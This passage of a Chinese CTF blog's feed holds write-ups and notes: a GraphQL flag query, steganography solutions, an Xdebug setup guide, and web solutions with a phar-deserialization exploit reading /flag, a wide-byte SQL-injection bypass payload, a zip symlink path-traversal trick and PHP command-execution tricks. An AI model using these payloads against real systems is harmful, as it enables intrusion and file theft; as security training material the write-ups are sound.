class="hljs-char escape_">\n</span>      &#125;<span class="hljs-char escape_">\n</span>      inputFields &#123;<span class="hljs-char escape_">\n</span>        ...InputValue<span class="hljs-char escape_">\n</span>      &#125;<span class="hljs-char escape_">\n</span>      interfaces &#123;<span class="hljs-char escape_">\n</span>        ...TypeRef<span class="hljs-char escape_">\n</span>      &#125;<span class="hljs-char escape_">\n</span>      enumValues(includeDeprecated: true) &#123;<span class="hljs-char escape_">\n</span>        name<span class="hljs-char escape_">\n</span>        description<span class="hljs-char escape_">\n</span>        isDeprecated<span class="hljs-char escape_">\n</span>        deprecationReason<span class="hljs-char escape_">\n</span>      &#125;<span class="hljs-char escape_">\n</span>      possibleTypes &#123;<span class="hljs-char escape_">\n</span>        ...TypeRef<span class="hljs-char escape_">\n</span>      &#125;<span class="hljs-char escape_">\n</span>    &#125;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>    fragment InputValue on __InputValue &#123;<span class="hljs-char escape_">\n</span>      name<span class="hljs-char escape_">\n</span>      description<span class="hljs-char escape_">\n</span>      type &#123; ...TypeRef &#125;<span class="hljs-char escape_">\n</span>      defaultValue<span class="hljs-char escape_">\n</span>    &#125;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>    fragment TypeRef on __Type &#123;<span class="hljs-char escape_">\n</span>      kind<span class="hljs-char escape_">\n</span>      name<span class="hljs-char escape_">\n</span>      ofType &#123;<span class="hljs-char escape_">\n</span>        kind<span class="hljs-char escape_">\n</span>        name<span class="hljs-char escape_">\n</span>        ofType &#123;<span class="hljs-char escape_">\n</span>          kind<span class="hljs-char escape_">\n</span>          name<span class="hljs-char escape_">\n</span>          ofType &#123;<span class="hljs-char escape_">\n</span>            kind<span class="hljs-char escape_">\n</span>            name<span class="hljs-char escape_">\n</span>            ofType &#123;<span class="hljs-char escape_">\n</span>              kind<span class="hljs-char escape_">\n</span>              name<span class="hljs-char escape_">\n</span>              ofType &#123;<span class="hljs-char escape_">\n</span>                kind<span class="hljs-char escape_">\n</span>                name<span class="hljs-char escape_">\n</span>                ofType &#123;<span class="hljs-char escape_">\n</span>                  kind<span class="hljs-char escape_">\n</span>                  name<span class="hljs-char escape_">\n</span>                  ofType &#123;<span class="hljs-char escape_">\n</span>                    kind<span class="hljs-char escape_">\n</span>                    name<span class="hljs-char escape_">\n</span>                  &#125;<span class="hljs-char escape_">\n</span>                &#125;<span class="hljs-char escape_">\n</span>              &#125;<span class="hljs-char escape_">\n</span>            &#125;<span class="hljs-char escape_">\n</span>          &#125;<span class="hljs-char escape_">\n</span>        &#125;<span class="hljs-char escape_">\n</span>      &#125;<span class="hljs-char escape_">\n</span>    &#125;<span class="hljs-char escape_">\n</span>&quot;</span>,<span class="hljs-string">&quot;variables&quot;</span>:<span class="hljs-literal">null</span>&#125;<br></code></pre></td></tr></table></figure><p>试了一下，成功查到数据</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209272043180.png" alt="image-20220927204319445"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ffffllllaaagggg_<span class="hljs-number">1</span><span class="hljs-symbol">n_h3</span>r<span class="hljs-number">3.</span>flag<br></code></pre></td></tr></table></figure><p>接着用她的接口查flag，构造了几次发现没有id这个参数</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">id</span><span class="hljs-operator">=</span><span class="hljs-number">9</span><span class="hljs-operator">&amp;</span><span class="hljs-variable">data</span><span class="hljs-operator">=</span>&#123;<span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;query&#123;<span class="hljs-char escape_">\n</span>ffffllllaaagggg_1n_h3r3_flag&#123;<span class="hljs-char escape_">\n</span>flag<span class="hljs-char escape_">\n</span>&#125;<span class="hljs-char escape_">\n</span>&#125;<span class="hljs-char escape_">\n</span>&quot;</span>,<span class="hljs-string">&quot;variables&quot;</span>:<span class="hljs-literal">null</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209272046789.png" alt="image-20220927204623722"></p><h1 id="misc第一周"><a href="#misc第一周" class="headerlink" title="misc第一周"></a>misc第一周</h1><p>misc也就第一周了，第二周不太想写，没有耐心，拼图和修Aztec Code太麻烦了。。（这玩意儿的纠错级别太多了，级别越高容错率越低），突然不喜欢misc了，好在也就偶尔玩玩。</p><h2 id="Look-my-eyes"><a href="#Look-my-eyes" class="headerlink" title="Look my eyes"></a>Look my eyes</h2><p>silenteye打开decode即可。</p><h2 id="qsdzs-girlfriend"><a href="#qsdzs-girlfriend" class="headerlink" title="qsdzs_girlfriend"></a>qsdzs_girlfriend</h2><p>压缩包爆破生日得到20031201</p><p>再百度识图，搜人物名称。</p><h2 id="奇怪的音频"><a href="#奇怪的音频" class="headerlink" title="奇怪的音频"></a>奇怪的音频</h2><p>SSTV，使用sstv解密工具就可以得到flag图片。</p><h2 id="Yesec-no-drumsticks"><a href="#Yesec-no-drumsticks" class="headerlink" title="Yesec_no_drumsticks"></a>Yesec_no_drumsticks</h2><p>lsb隐写，zsteg检测得到flag。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">zsteg -<span class="hljs-selector-tag">a</span> xx<span class="hljs-selector-class">.png</span><br></code></pre></td></tr></table></figure><h2 id="EzSnake"><a href="#EzSnake" class="headerlink" title="EzSnake"></a>EzSnake</h2><p>用cheat engine，修改score即可</p>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>NewStar</tag>
      
      <tag>2022</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPSTORM配置debug的坑点</title>
    <link href="/2022/09/25/PHPSTORM%E9%85%8D%E7%BD%AEdebug%E7%9A%84%E5%9D%91%E7%82%B9/"/>
    <url>/2022/09/25/PHPSTORM%E9%85%8D%E7%BD%AEdebug%E7%9A%84%E5%9D%91%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="PHPSTORM配置debug的坑点"><a href="#PHPSTORM配置debug的坑点" class="headerlink" title="PHPSTORM配置debug的坑点"></a>PHPSTORM配置debug的坑点</h1><p>本来前段时间就试过一次配置，但是奈何很多帖子都是重复的内容，因此我重复的配置失败。这里就记录一些可能别人帖子没提起的细节，不记录全过程。</p><p>我的配置环境</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PHPSTORM</span> <span class="hljs-number">2022</span>.<span class="hljs-number">2</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">PHP7</span>.<span class="hljs-number">3</span>.<span class="hljs-number">4</span><br><span class="hljs-attribute">phpstudy_pro</span> <span class="hljs-number">8.1.1.3</span><br></code></pre></td></tr></table></figure><h2 id="一、xdebug配置"><a href="#一、xdebug配置" class="headerlink" title="一、xdebug配置"></a>一、xdebug配置</h2><p>info.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>打开phpinfo的html，复制<strong>所有</strong>源代码</p><p>粘贴到<a href="https://xdebug.org/wizard">https://xdebug.org/wizard</a> 进行分析，会对你的PHP版本推荐出合适的xdebug版本。</p><h3 id="1-host和port"><a href="#1-host和port" class="headerlink" title="1.host和port"></a>1.host和port</h3><p>复制别人提供的xdebug配置内容时要注意</p><p>xdebug3和xdebug2的属性名存在差异，</p><p>xdebug.remote_host和xdebug.remote_port不适用，做出了以下更改：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">xdebug</span>.remote_host <span class="hljs-comment">---&gt;  xdebug.client_host</span><br><span class="hljs-title">xdebug</span>.remote_<span class="hljs-keyword">port</span> <span class="hljs-comment">---&gt;  xdebug.client_port</span><br></code></pre></td></tr></table></figure><h3 id="2-zend-extension"><a href="#2-zend-extension" class="headerlink" title="2.zend_extension"></a>2.zend_extension</h3><p>zend_extension别忘了更换成自己的xdebug dll路径。</p><h3 id="3-xdebug-mode"><a href="#3-xdebug-mode" class="headerlink" title="3.xdebug.mode"></a>3.xdebug.mode</h3><p>xdebug.mode需要设为debug。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">xdebug.mode</span>=debug<br></code></pre></td></tr></table></figure><p>这是我的xdebug配置，给大家参考一下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[xdebug]</span><br><span class="hljs-attr">zend_extension</span> = D:\phpstudy_pro\Extensions\php\php7.<span class="hljs-number">3.4</span>nts\ext\php_xdebug.dll<br><span class="hljs-attr">xdebug.remote_enable</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.remote_handler</span> = dbgp<br><span class="hljs-attr">xdebug.remote_mode</span> = req<br><span class="hljs-attr">xdebug.mode</span>=debug<br><span class="hljs-attr">xdebug.idekey</span> = <span class="hljs-string">&quot;PHPSTORM&quot;</span><br><span class="hljs-attr">xdebug.client_host</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-attr">xdebug.client_port</span>=<span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><h2 id="二、验证"><a href="#二、验证" class="headerlink" title="二、验证"></a>二、验证</h2><p>配置完成后可以通过PHPSTORM中调试的验证进行配置验证</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251443060.png" alt="image-20220925144304331"></p><p>这里的验证脚本路径一定要和服务器里的网站路径一致</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251444026.png" alt="image-20220925144427791"></p><p>默认就是phpstudy的WWW路径，url不用改。</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251445572.png" alt="image-20220925144523996"></p><p>正常配置成功是这样的：</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251446439.png" alt="image-20220925144642550"></p><p>如果xdebug配置有问题的话，调试器拓展那一步会出错，建议回phpinfo检查一下（可能是host，port，idekey出错）。</p><p>然后配置浏览器插件xdebug helper。</p><h2 id="三、配置完成后"><a href="#三、配置完成后" class="headerlink" title="三、配置完成后"></a>三、配置完成后</h2><p>配置完xdebug后，可以开始debug</p><h3 id="开始debug打开的是一个空白界面"><a href="#开始debug打开的是一个空白界面" class="headerlink" title="开始debug打开的是一个空白界面"></a>开始debug打开的是一个空白界面</h3><p>这里需要编辑xdebug配置</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251454133.png" alt="image-20220925145449058"></p><p>这里有一个起始url，改成我们要调试的php文件相对路径（这个文件需要在我们指定的网站服务器文件夹内，比如我的是<a href="http://www.ctf,那我的php文件就在www.ctf这个文件夹内)/">www.ctf，那我的php文件就在www.ctf这个文件夹内）</a></p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251457576.png" alt="image-20220925145701506"></p><p>浏览器也改成配置好了xdebug helper的浏览器。</p><p>别忘了修改侦听状态为如下，并且打上断点。</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251500006.png" alt="image-20220925145959115"></p><p>如果都没问题，点击那个debug的臭虫标志就会使用默认浏览器打开我们的php文件。</p>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022第五空间网络安全初赛</title>
    <link href="/2022/09/25/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/"/>
    <url>/2022/09/25/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="2022第五空间网络安全初赛"><a href="#2022第五空间网络安全初赛" class="headerlink" title="2022第五空间网络安全初赛"></a>2022第五空间网络安全初赛</h1><p>web难度不大，都被打烂了，是我太菜了。</p><h2 id="5-web-BaliYun"><a href="#5-web-BaliYun" class="headerlink" title="5_web_BaliYun"></a>5_web_BaliYun</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">题目描述：<br>一个简单的图床上传<br></code></pre></td></tr></table></figure><h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">phar反序列化<br></code></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">upload</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$size</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Valid_ext</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;ext = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]));<br>        <span class="hljs-variable language_">$this</span>-&gt;size = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] / <span class="hljs-number">1024</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;Valid_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">start</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;filename))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Image already exsists&quot;</span>;<br>        &#125;<span class="hljs-keyword">elseif</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;ext, <span class="hljs-variable">$this</span>-&gt;Valid_ext))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Only Image Can Be Uploaded&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">move</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">move</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-string">&quot;upload/&quot;</span>.<span class="hljs-variable">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Upload succsess!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">check_img</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$img_name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;img_name = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_name&#x27;</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">img_check</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;img_name))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Image exsists&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Image not exsists&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>file_exists确认一下flag，就构造phar反序列化利用wakeup进行文件读取</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">upload</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/flag&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">upload</span>();<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;exp.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>上传别忘了改后缀名，接着</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?img_name=phar:<span class="hljs-regexp">//u</span>pload/gg.jpg<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251106457.png" alt="image-20220925110513212"></p><h2 id="5-easylogin"><a href="#5-easylogin" class="headerlink" title="5_easylogin"></a>5_easylogin</h2><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">题目描述：<br>IP地址：<span class="hljs-number">39</span>.<span class="hljs-number">105</span>.<span class="hljs-number">13</span>.<span class="hljs-number">61</span><br>端口：<span class="hljs-number">31088</span><br>题目提示：<br><span class="hljs-number">123.57.19.238:31088</span><br></code></pre></td></tr></table></figure><h4 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h4><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">宽字节注入+双写绕过+<span class="hljs-built_in">md5</span>比较<br></code></pre></td></tr></table></figure><p><a href="http://123.57.19.238:31088/login.php">http://123.57.19.238:31088/login.php</a></p><p>赛后复现的（赛后公共靶机没关，趁机复现了一下，360真好），md5比较当时没想到。。</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">username=<span class="hljs-number">1</span>%df&#x27;/**/uniunionon/**/seleselectct/**/1,version(),0x<span class="hljs-number">63346361343233</span><span class="hljs-number">38613062393233</span><span class="hljs-number">38323064636335</span><span class="hljs-number">30396136663735</span><span class="hljs-number">38343962</span>%23&amp;password=1<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251106826.png" alt="image-20220925110456913"></p><p>查啥都给flag。</p><p>第三个字段&#x3D;MD5($_POST[password])。</p><h2 id="sakana-reveage"><a href="#sakana-reveage" class="headerlink" title="sakana_reveage"></a>sakana_reveage</h2><p>找到原题：(<a href="https://ctftime.org/writeup/35410">https://ctftime.org/writeup/35410</a>)</p><p>照着复现就行，绑定一个指向flag的软链接在zip上，再绑定图片，获取图片的base上传。</p><p>构造路径穿越</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/tmp/</span>sakanas.zip.zip<br></code></pre></td></tr></table></figure><p>上传后选择上传压缩包功能，使其报错，上传的zip压缩包就会被解压，接着就可以访问软链接得到flag内容。</p>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>第五空间</tag>
      
      <tag>2022</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web细节浅记</title>
    <link href="/2022/09/18/web%E6%B5%85%E8%AE%B0/"/>
    <url>/2022/09/18/web%E6%B5%85%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>记得比较杂，一些web的小细节，持续更新。</p><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>echo命令执行系统命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span>`nl fl<span class="hljs-string">&#x27;&#x27;</span>ag.p?p`;<br></code></pre></td></tr></table></figure><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>文件包含include()，include可以无括号包含</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码。</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>自增RCE可以借助借助NaN和INF</p><p>NaN（Not a Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是1985年的IEEE 754浮点数标准。</p><p>INF：infinite，表示“无穷大”。 超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span>_=C/C;<span class="hljs-comment">//NAN</span><br><span class="hljs-symbol">$</span>_=<span class="hljs-number">1</span>/C<span class="hljs-comment">//INF</span><br></code></pre></td></tr></table></figure><p>分别对应</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span>_=<span class="hljs-number">0</span>/<span class="hljs-number">0</span>;<span class="hljs-comment">//NAN</span><br><span class="hljs-symbol">$</span>_=<span class="hljs-number">1</span>/<span class="hljs-number">0</span><span class="hljs-comment">//INF</span><br></code></pre></td></tr></table></figure><p>%得到NAIF四个字符，需要<strong>拼接字符串</strong>才能得到</p><p>如</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-type">$_</span><span class="hljs-operator">=</span><span class="hljs-built_in">C</span><span class="hljs-operator">/</span><span class="hljs-built_in">C</span><span class="hljs-operator">.</span><span class="hljs-variable">c</span><span class="hljs-operator">;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210051138230.png" alt="image-20221005113821225"></p><p>虽然报错，但成功获得。</p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>php遇到不认识的协议就会当目录处理</p><p>比如0:&#x2F;&#x2F;</p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p>php引用，就是在变量或者函数、对象等前面加上&amp;符号</p><p>表示不同变量指向同一个内容（反序列化时也可使用）</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p>sql注入时长度超长导致的报错是因为sql_mode为严格模式</p><h3 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h3><p>宽字节注入payload构造，宽字节在线urldecode</p><p><a href="http://www.mytju.com/classcode/tools/urldecode_gb2312.asp">http://www.mytju.com/classcode/tools/urldecode_gb2312.asp</a></p><p>转义字符为</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%27</span><br></code></pre></td></tr></table></figure><p>在它前面构造就行，例如</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%d9</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%27</span><br><span class="hljs-variable">%c9</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%27</span><br></code></pre></td></tr></table></figure><p>注入时需要注意使用hackbar时可能会受影响，最好使用bp。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>浅记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python_zipfile</title>
    <link href="/2022/09/18/python-zipfile/"/>
